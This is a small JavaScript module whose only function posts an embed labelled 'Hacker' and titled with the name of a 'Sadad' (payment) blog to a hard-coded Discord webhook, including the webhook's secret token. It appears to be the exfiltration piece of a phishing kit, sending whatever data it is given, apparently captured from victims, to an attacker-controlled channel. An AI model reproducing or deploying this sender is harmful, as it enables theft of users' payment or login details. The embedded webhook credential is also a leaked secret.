import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1321170915832365118/eoF1BrZ6Ftazc_SLuBPUTefVATxOuC4GKj6HlNy-TYIGPWcelbK6k3E210jgrl_d0-pT",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
